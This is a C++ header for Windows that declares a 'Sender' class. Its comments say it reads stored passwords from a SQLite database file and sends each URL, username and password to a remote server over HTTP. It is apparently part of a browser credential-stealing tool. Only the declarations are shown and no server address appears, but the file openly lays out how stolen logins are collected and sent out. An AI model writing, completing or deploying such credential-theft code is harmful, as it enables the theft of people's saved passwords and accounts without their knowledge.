#pragma once
#include <iostream>
#include <windows.h>
#include <string>
#include <wincrypt.h>
#include <winsqlite/winsqlite3.h>
#include <WinHttp.h>
#pragma comment(lib, "Winhttp")

using namespace std;
//read passwords from database and to host via http
class Sender
{
private:
	static LPCWSTR baseUrl;
	static LPCWSTR apiPath;
	static HINTERNET hConnect;

	//callback function of sql_exec, it will call a function to send the password
	static int sqlCallback(void* notUsed, int argc, char** argv, char** azColName);

	//send the passwords to the server
	static int sendData(string url, string username, string passwords);

	//read the passwords from the database file
	static void readPasswords(string dbPath);
public:
	//prepare the connection to send the passwords to server
	static void sendPasswords(string dbPath);
};